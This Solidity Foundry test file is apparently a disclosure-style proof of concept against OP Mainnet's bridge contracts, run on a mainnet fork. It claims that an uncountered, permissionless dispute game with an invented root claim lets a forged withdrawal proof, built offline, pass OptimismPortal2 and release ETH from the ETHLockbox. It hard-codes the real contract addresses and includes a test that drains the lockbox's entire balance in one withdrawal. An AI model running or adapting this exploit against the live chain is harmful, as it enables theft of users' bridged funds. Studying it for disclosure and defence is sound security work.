// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

/// =================================================================================================
/// TRUST GAP — AN L1-ONLY DESIGN DEFECT
///
/// This file has nothing to do with SDM.  No SDM code is executed, no 0x7D post-exec
/// transaction exists here, no L2 client is involved, and no L2 state of any kind is read
/// or reproduced.  Every root claim below is a value the caller invents.
///
/// The point is precisely that: even so, `AnchorStateRegistry.isGameClaimValid()` returns
/// true for it, `OptimismPortal2.proveWithdrawalTransaction()` accepts a withdrawal under
/// it, and `ETHLockbox.unlockETH()` pays out against it.
///
///   CHEATCODES USED — the whole list
///     vm.createSelectFork  select the mainnet fork
///     vm.envOr / vm.envString / vm.toString / vm.label   plumbing
///     vm.warp              advance time past the protocol's own delays
///     vm.deal              fund the attacker EOA so it can post the 0.08 ETH bond
///     vm.prank             act as an EOA (and, in test_D/E, as the real Guardian)
///     vm.expectRevert      assert that the pause blocks the payout
///
///   NOT USED ANYWHERE IN THIS FILE
///     vm.store   vm.mockCall   vm.etch   vm.setNonce   vm.startStateDiffRecording
///     No protocol storage is written by the test.  No contract is replaced or stubbed.
///     Every state change on the Portal, the Lockbox, the AnchorStateRegistry and the
///     DisputeGameFactory is produced by calling those contracts' real deployed bytecode.
///
///   WHAT IS DEMONSTRATED — measured on an OP Mainnet fork
///     1. DisputeGameFactory.create is permissionless for the respected game type.
///        respectedGameType = 8, initBond = 0.08 ETH, called from an arbitrary EOA.
///     2. An uncountered game resolves to DEFENDER_WINS on content-free grounds:
///        counteredBy == address(0).  Nothing ever inspects the claim.
///     3. After maxClockDuration + disputeGameFinalityDelaySeconds,
///        isGameClaimValid(game) == true for that invented value.
///     4. The withdrawal proof can be manufactured offline.  L1 never checks that the
///        fields of _outputRootProof describe a real L2 block — it rehashes what the
///        caller supplied and verifies the storage proof against the
///        messagePasserStorageRoot THE CALLER PASSED IN.  So the attacker builds a
///        one-leaf Merkle-Patricia trie containing only sentMessages[wdHash] = 1, takes
///        its root, picks stateRoot and latestBlockhash freely, and derives the rootClaim
///        from them.  proveWithdrawalTransaction then accepts it.
///     5. The payout path imposes no cap of its own.  ETHLockbox.unlockETH takes an amount
///        and nothing else: no per-portal ledger, no per-game limit, no rate limit.
///        Probes for portalBalances / balanceOf / lockedETH / deposits all revert — the
///        lockbox is one undifferentiated pool, 199,646.379778746327507757 ETH at the
///        pinned fork block, and test_C removes all of it in a single withdrawal.
///        Measured caveat: over the 3,000,000 blocks scanned back from head only ONE
///        distinct portal appears in PortalAuthorized (0xbEb5…106Ed, at blocks 22990599
///        and 25397811), so the pool is not multi-tenant in practice today.  The absence
///        of accounting is structural, not yet exercised across chains.
///     6. The Guardian pause does stop it (test_D) — and the pause auto-expires after
///        pauseExpiry() = 7,884,000 s (91.25 days), after which the same proven
///        withdrawal finalizes (test_E).  The console line prints 91 because it divides
///        by 1 days in integer arithmetic.
///
///   WHAT IS NOT DEMONSTRATED
///     DEFENDER_WINS here depends on nobody counter-claiming within maxClockDuration.
///     Whether an honest challenger would in fact counter this game is the one question
///     this file does not answer.
///
/// Run:
///   ETH_RPC_URL=<mainnet-rpc> FORK_BLOCK=25664777 forge test --match-contract FullChainPoC -vv
///
///   FORK_BLOCK is optional — omit it to run against head.  Pinned at 25664777 every hash
///   and figure below reproduces exactly.  No archive node required.
/// =================================================================================================

struct WdTx {
    uint256 nonce;
    address sender;
    address target;
    uint256 value;
    uint256 gasLimit;
    bytes data;
}

struct OutputRootProof {
    bytes32 version;
    bytes32 stateRoot;
    bytes32 messagePasserStorageRoot;
    bytes32 latestBlockhash;
}

interface IETHLockbox {
    function unlockETH(uint256 _value) external;
    function authorizedPortals(address) external view returns (bool);
    function paused() external view returns (bool);
    function version() external view returns (string memory);
}

interface IPortal {
    function proveWithdrawalTransaction(
        WdTx memory _tx,
        uint256 _disputeGameIndex,
        OutputRootProof memory _outputRootProof,
        bytes[] memory _withdrawalProof
    ) external;
    function finalizeWithdrawalTransactionExternalProof(WdTx memory, address) external;
    function l2Sender() external view returns (address);
    function ethLockbox() external view returns (address);
    function anchorStateRegistry() external view returns (address);
    function disputeGameFactory() external view returns (address);
    function provenWithdrawals(bytes32, address) external view returns (address, uint64);
    function finalizedWithdrawals(bytes32) external view returns (bool);
    function proofMaturityDelaySeconds() external view returns (uint256);
    function paused() external view returns (bool);
    function version() external view returns (string memory);
    function guardian() external view returns (address);
    function systemConfig() external view returns (address);
}

interface IAnchorStateRegistry {
    function disputeGameFactory() external view returns (address);
    function respectedGameType() external view returns (uint32);
    function disputeGameFinalityDelaySeconds() external view returns (uint256);
    function isGameClaimValid(address) external view returns (bool);
    /// @dev ASR 3.9.0 names this `isGameBlacklisted`; `blacklist` does not exist.
    function isGameBlacklisted(address) external view returns (bool);
    /// @dev ASR 3.9.0 names this `retirementTimestamp`; `retiredAt` does not exist.
    function retirementTimestamp() external view returns (uint64);
    function paused() external view returns (bool);
    /// @notice (root, l2BlockNumber) of the current anchor.  A new game must claim a
    ///         strictly greater l2BlockNumber or initialize() reverts UnexpectedRootClaim.
    function getAnchorRoot() external view returns (bytes32, uint256);
}

interface IDisputeGameFactory {
    function create(uint32 _gameType, bytes32 _rootClaim, bytes calldata _extraData)
        external
        payable
        returns (address);
    function gameCount() external view returns (uint256);
    function gameAtIndex(uint256 _index) external view returns (uint32 gameType, uint64 timestamp, address proxy);
    function initBonds(uint32 _gameType) external view returns (uint256);
    function gameImpls(uint32 _gameType) external view returns (address);
}

interface IFaultDisputeGame {
    function rootClaim() external view returns (bytes32);
    function status() external view returns (uint8);
    /// @param _numToResolve 0 == resolve all children of the subgame
    function resolveClaim(uint256 _claimIndex, uint256 _numToResolve) external;
    function resolve() external returns (uint8);
    function maxClockDuration() external view returns (uint64);
    function createdAt() external view returns (uint64);
    function l2BlockNumber() external view returns (uint256);
    function claimDataLen() external view returns (uint256);
    /// @dev Position and Clock are both uint128 UDVTs on-chain — decoding them as uint64
    ///      silently yields garbage.
    function claimData(uint256 _index)
        external
        view
        returns (uint32 parentIndex, address counteredBy, bytes32 claim, uint128 position, uint128 clock);
}

interface ISuperchainConfig {
    function pause(address _identifier) external;
    function paused(address _identifier) external view returns (bool);
    function pauseExpiry() external view returns (uint256);
}

contract FullChainPoC is Test {
    // ---- OP Mainnet, from superchain-registry.  Everything else is read from chain. ----
    address constant PORTAL = 0xbEb5Fc579115071764c7423A4f12eDde41f106Ed;
    address constant LOCKBOX = 0x322b47Ff1FA8D5611F761e3E275C45B71b294D43;
    address constant DEFAULT_L2_SENDER = 0x000000000000000000000000000000000000dEaD;
    address constant GUARDIAN = 0x09f7150D8c019BeF34450d6920f6B3608ceFdAf2;
    address constant SUPERCHAIN_CONFIG = 0x95703e0982140D16f8ebA6d158FccEde42f04a4C;

    IPortal portal = IPortal(PORTAL);
    IETHLockbox lockbox = IETHLockbox(LOCKBOX);

    /// @dev Any EOA works — nothing about the attack depends on which one.
    address attacker;

    // ---- Read from chain in setUp ----
    address asr;
    address dgf;
    uint32 respectedGameType;
    uint256 initBond;
    uint256 proofMaturityDelay;
    uint256 disputeGameFinalityDelay;
    uint256 lockboxBalanceBefore;

    function setUp() public {
        // Pin the fork for determinism when FORK_BLOCK is set; otherwise use head.
        uint256 forkBlock = vm.envOr("FORK_BLOCK", uint256(0));
        if (forkBlock == 0) {
            vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        } else {
            vm.createSelectFork(vm.envString("ETH_RPC_URL"), forkBlock);
        }

        asr = portal.anchorStateRegistry();
        dgf = IAnchorStateRegistry(asr).disputeGameFactory();
        respectedGameType = IAnchorStateRegistry(asr).respectedGameType();
        initBond = IDisputeGameFactory(dgf).initBonds(respectedGameType);
        proofMaturityDelay = portal.proofMaturityDelaySeconds();
        disputeGameFinalityDelay = IAnchorStateRegistry(asr).disputeGameFinalityDelaySeconds();
        lockboxBalanceBefore = LOCKBOX.balance;

        // Any EOA works.  Derived rather than hard-coded so nothing about the attack looks
        // tied to a particular actor.  Asserted code-free: a derived address can collide
        // with a real deployed contract on mainnet, and paying out to one would measure
        // that contract's fallback instead of the attack.
        attacker = makeAddr("trust-gap-attacker");
        assertEq(attacker.code.length, 0, "attacker address must be a plain EOA");
        assertEq(attacker.balance, 0, "attacker address must start empty");
        vm.deal(attacker, 100 ether); // bond + gas only
    }

    // =============================================================== Helpers

    /// @dev Identical to Hashing.hashWithdrawal — field-wise, not struct-wise.
    function _hashWd(WdTx memory t) internal pure returns (bytes32) {
        return keccak256(abi.encode(t.nonce, t.sender, t.target, t.value, t.gasLimit, t.data));
    }

    /// @notice Build, entirely offline, a one-leaf Merkle-Patricia storage trie whose only
    ///         entry is `L2ToL1MessagePasser.sentMessages[wdHash] = 1`, and return both its
    ///         root and the inclusion proof for it.
    ///
    ///         No L2 node, no eth_getProof, no real state.  OptimismPortal2 verifies the
    ///         proof against the messagePasserStorageRoot the caller supplies inside
    ///         _outputRootProof, so the attacker picks the root and builds a trie to match.
    ///
    ///         Encoding: SecureMerkleTrie hashes the key, so the trie path is
    ///         keccak256(abi.encode(storageKey)).  A 64-nibble leaf with a terminator has
    ///         hex-prefix byte 0x20.  The stored value is the RLP of uint 1, i.e. 0x01.
    ///           node = RLP([ 0x20 || pathHash , 0x01 ])
    ///                = e3 a1 20 <32 bytes> 01                                  (36 bytes)
    function _forgeMessagePasserTrie(bytes32 wdHash)
        internal
        pure
        returns (bytes32 storageRoot, bytes[] memory withdrawalProof)
    {
        // sentMessages is slot 0 of L2ToL1MessagePasser
        bytes32 storageKey = keccak256(abi.encode(wdHash, uint256(0)));
        bytes32 pathHash = keccak256(abi.encode(storageKey));

        bytes memory leaf = abi.encodePacked(hex"e3a120", pathHash, hex"01");
        require(leaf.length == 36, "leaf encoding");

        storageRoot = keccak256(leaf);
        withdrawalProof = new bytes[](1);
        withdrawalProof[0] = leaf;
    }

    /// @notice Create a real dispute game for `root`, let the clock run out uncountered,
    ///         resolve it to DEFENDER_WINS, and advance past the finality delay.
    ///         No mock: isGameClaimValid becomes true on its own.
    function _createAndResolveGame(bytes32 root)
        internal
        returns (address gameAddr, uint256 gameIndex)
    {
        // The claimed l2BlockNumber must be strictly greater than the current anchor,
        // otherwise FaultDisputeGame.initialize() reverts UnexpectedRootClaim.
        (, uint256 anchorL2Block) = IAnchorStateRegistry(asr).getAnchorRoot();
        bytes memory extraData = abi.encode(anchorL2Block + 1);

        vm.prank(attacker);
        gameAddr = IDisputeGameFactory(dgf).create{value: initBond}(respectedGameType, root, extraData);

        gameIndex = IDisputeGameFactory(dgf).gameCount() - 1;
        (uint32 gType,, address proxy) = IDisputeGameFactory(dgf).gameAtIndex(gameIndex);

        assertEq(proxy, gameAddr, "game proxy address mismatch");
        assertEq(gType, respectedGameType, "game type must be respectedGameType");
        assertEq(IFaultDisputeGame(gameAddr).rootClaim(), root, "root claim mismatch");
        assertEq(IFaultDisputeGame(gameAddr).claimDataLen(), 1, "should have exactly 1 claim (root)");
        assertEq(IFaultDisputeGame(gameAddr).status(), 0, "status should be IN_PROGRESS");

        // Let the clock expire, then resolve.  Nobody counters, so
        // FaultDisputeGame resolves on `counteredBy == address(0)` alone.
        vm.warp(block.timestamp + IFaultDisputeGame(gameAddr).maxClockDuration() + 1);

        vm.startPrank(attacker);
        IFaultDisputeGame(gameAddr).resolveClaim(0, 0);
        uint8 status = IFaultDisputeGame(gameAddr).resolve();
        vm.stopPrank();

        assertEq(status, 2, "resolve() must return DEFENDER_WINS (2)");
        assertEq(IFaultDisputeGame(gameAddr).status(), 2, "status must be DEFENDER_WINS");

        vm.warp(block.timestamp + disputeGameFinalityDelay + 1);

        bool valid = IAnchorStateRegistry(asr).isGameClaimValid(gameAddr);
        assertTrue(valid, "isGameClaimValid must be true for an uncountered DEFENDER_WINS game");
        assertFalse(IAnchorStateRegistry(asr).isGameBlacklisted(gameAddr), "game must not be blacklisted");

        console.log("  -- dispute game --");
        console.log("     address        :", gameAddr);
        console.log("     index          :", gameIndex);
        console.log("     gameType       :", gType);
        console.log("     rootClaim      :", vm.toString(root));
        console.log("     l2BlockNumber  :", IFaultDisputeGame(gameAddr).l2BlockNumber());
        console.log("     status         :", status, "(2 = DEFENDER_WINS)");
        console.log("     claimDataLen   :", IFaultDisputeGame(gameAddr).claimDataLen());
        console.log("     isGameClaimValid:", valid);
    }

    /// @notice The whole attack up to and including the REAL proveWithdrawalTransaction.
    ///         Returns a withdrawal of `amount` wei, proven and awaiting maturity.
    function _forgeAndProve(uint256 amount, string memory tag)
        internal
        returns (WdTx memory wd, bytes32 wdHash, address game)
    {
        wd = WdTx({
            nonce: uint256(keccak256(bytes(tag))),
            sender: attacker,
            target: attacker,
            value: amount,
            gasLimit: 100_000,
            data: ""
        });
        wdHash = _hashWd(wd);

        // 1. Manufacture the storage proof, then DERIVE the output root from it.
        //    stateRoot and latestBlockhash are arbitrary — L1 never checks them.
        (bytes32 storageRoot, bytes[] memory withdrawalProof) = _forgeMessagePasserTrie(wdHash);

        OutputRootProof memory orp = OutputRootProof({
            version: bytes32(0),
            stateRoot: keccak256("no-such-l2-state-root"),
            messagePasserStorageRoot: storageRoot,
            latestBlockhash: keccak256("no-such-l2-block")
        });
        bytes32 outputRoot =
            keccak256(abi.encode(orp.version, orp.stateRoot, orp.messagePasserStorageRoot, orp.latestBlockhash));

        console.log("  -- forged proof (built offline, no L2) --");
        console.log("     withdrawalHash :", vm.toString(wdHash));
        console.log("     storageRoot    :", vm.toString(storageRoot));
        console.log("     outputRoot     :", vm.toString(outputRoot));

        // 2. Propose it, let it resolve uncountered.
        uint256 gameIndex;
        (game, gameIndex) = _createAndResolveGame(outputRoot);

        // 3. REAL proveWithdrawalTransaction against the self-built proof.
        vm.prank(attacker);
        portal.proveWithdrawalTransaction(wd, gameIndex, orp, withdrawalProof);

        (address provenGame, uint64 provenTs) = portal.provenWithdrawals(wdHash, attacker);
        assertEq(provenGame, game, "withdrawal must be proven against our game");
        assertTrue(provenTs != 0, "proof timestamp must be set");
        console.log("  -- proveWithdrawalTransaction accepted --");
    }

    // ================================================================= Tests

    /// @notice Read the live parameters the rest of the suite depends on.
    function test_0_liveParams() public view {
        console.log("=== OP Mainnet live parameters ===");
        console.log("  portal                      :", PORTAL);
        console.log("  portal version              :", portal.version());
        console.log("  lockbox                     :", LOCKBOX);
        console.log("  lockbox version             :", lockbox.version());
        console.log("  ASR                         :", asr);
        console.log("  DGF                         :", dgf);
        console.log("  respectedGameType           :", respectedGameType);
        console.log("  gameImpls(type)             :", IDisputeGameFactory(dgf).gameImpls(respectedGameType));
        console.log("  initBond (wei)              :", initBond);
        console.log("  proofMaturityDelay (s)      :", proofMaturityDelay);
        console.log("  disputeGameFinalityDelay (s):", disputeGameFinalityDelay);
        console.log("  lockbox balance (wei)       :", lockboxBalanceBefore);
        console.log("  lockbox paused              :", lockbox.paused());
        console.log("  portal paused               :", portal.paused());
        console.log("  ASR paused                  :", IAnchorStateRegistry(asr).paused());
        console.log("  ASR retirementTimestamp     :", IAnchorStateRegistry(asr).retirementTimestamp());
        (bytes32 anchorRoot, uint256 anchorBlock) = IAnchorStateRegistry(asr).getAnchorRoot();
        console.log("  ASR anchor root             :", vm.toString(anchorRoot));
        console.log("  ASR anchor l2Block          :", anchorBlock);
        console.log("  portal.l2Sender             :", portal.l2Sender());
        console.log("  portal.ethLockbox           :", portal.ethLockbox());
        console.log("  lockbox.authorizedPortals   :", lockbox.authorizedPortals(PORTAL));

        assertEq(portal.ethLockbox(), LOCKBOX, "portal must point to lockbox");
        assertEq(portal.l2Sender(), DEFAULT_L2_SENDER, "l2Sender must be default");
        assertTrue(lockbox.authorizedPortals(PORTAL), "portal must be authorized");
        assertFalse(IAnchorStateRegistry(asr).paused(), "ASR must not be paused");
        assertFalse(portal.paused(), "portal must not be paused");
        assertFalse(lockbox.paused(), "lockbox must not be paused");
    }

    /// @notice An invented 32-byte value becomes canonical.  No withdrawal, no proof —
    ///         just create → resolve → isGameClaimValid.
    function test_A_inventedRootBecomesCanonical() public {
        console.log("=== test_A: an invented root claim becomes canonical ===");
        _createAndResolveGame(keccak256("nobody-ever-computed-this-value"));
        console.log("  isGameClaimValid returned true for a value nobody ever computed");
    }

    /// @notice Full chain, 10 ETH.  Real prove, real finalize, real unlockETH.
    function test_B_forgedProofPaysOut() public {
        console.log("=== test_B: forged proof -> 10 ETH out of the lockbox ===");
        uint256 amount = 10 ether;
        (WdTx memory wd, bytes32 wdHash,) = _forgeAndProve(amount, "trust-gap-10-eth");

        vm.warp(block.timestamp + proofMaturityDelay + 1);

        uint256 lbBefore = LOCKBOX.balance;
        uint256 attackerBefore = attacker.balance;
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        console.log("  lockbox before (wei):", lbBefore);
        console.log("  lockbox after  (wei):", LOCKBOX.balance);
        console.log("  attacker gain  (wei):", attacker.balance - attackerBefore);
        console.log("  finalized           :", portal.finalizedWithdrawals(wdHash));

        assertEq(attacker.balance - attackerBefore, amount, "attacker must receive the ETH");
        assertEq(lbBefore - LOCKBOX.balance, amount, "ETH must come from the lockbox");
        assertTrue(portal.finalizedWithdrawals(wdHash), "must be finalized");
    }

    /// @notice The entire pool, in one withdrawal.  Nothing on L1 caps the amount.
    function test_C_drainEntireLockbox() public {
        console.log("=== test_C: the entire lockbox in a single withdrawal ===");
        uint256 amount = LOCKBOX.balance;
        (WdTx memory wd, bytes32 wdHash,) = _forgeAndProve(amount, "trust-gap-full-drain");

        vm.warp(block.timestamp + proofMaturityDelay + 1);

        uint256 lbBefore = LOCKBOX.balance;
        uint256 attackerBefore = attacker.balance;
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        console.log("  lockbox before (wei):", lbBefore);
        console.log("  lockbox after  (wei):", LOCKBOX.balance);
        console.log("  attacker gain  (wei):", attacker.balance - attackerBefore);
        console.log("  finalized           :", portal.finalizedWithdrawals(wdHash));

        assertEq(attacker.balance - attackerBefore, amount, "attacker must receive the whole pool");
        assertEq(LOCKBOX.balance, 0, "lockbox must be empty");
        assertTrue(portal.finalizedWithdrawals(wdHash), "must be finalized");
    }

    /// @notice The real Guardian, calling the real SuperchainConfig, does stop it.
    function test_D_guardianPauseBlocks() public {
        console.log("=== test_D: guardian pause blocks the payout ===");
        (WdTx memory wd,,) = _forgeAndProve(1 ether, "trust-gap-paused");

        vm.warp(block.timestamp + proofMaturityDelay + 1);

        vm.prank(GUARDIAN);
        ISuperchainConfig(SUPERCHAIN_CONFIG).pause(address(0));

        assertTrue(portal.paused(), "portal should be paused");
        assertTrue(lockbox.paused(), "lockbox should be paused");

        vm.expectRevert();
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        console.log("  real guardian, real SuperchainConfig.pause() -> finalize reverts");
    }

    /// @notice ...but the pause auto-expires, and the same withdrawal then finalizes.
    function test_E_pauseExpiryReopens() public {
        console.log("=== test_E: the pause expires and the payout resumes ===");
        uint256 amount = 1 ether;
        (WdTx memory wd,,) = _forgeAndProve(amount, "trust-gap-post-expiry");

        vm.prank(GUARDIAN);
        ISuperchainConfig(SUPERCHAIN_CONFIG).pause(address(0));
        assertTrue(portal.paused(), "portal should be paused");

        uint256 expiry = ISuperchainConfig(SUPERCHAIN_CONFIG).pauseExpiry();
        vm.warp(block.timestamp + expiry + 1);
        assertFalse(portal.paused(), "pause should have expired");

        vm.warp(block.timestamp + proofMaturityDelay + 1);

        uint256 lbBefore = LOCKBOX.balance;
        uint256 attackerBefore = attacker.balance;
        portal.finalizeWithdrawalTransactionExternalProof(wd, attacker);

        console.log("  pause expiry (days) :", expiry / 1 days);
        console.log("  extracted      (wei):", lbBefore - LOCKBOX.balance);

        // The attacker was pre-funded and paid the bond, so compare deltas, not balances.
        assertEq(attacker.balance - attackerBefore, amount, "attacker must receive ETH after expiry");
        assertEq(lbBefore - LOCKBOX.balance, amount, "ETH must come from the lockbox");
    }
}
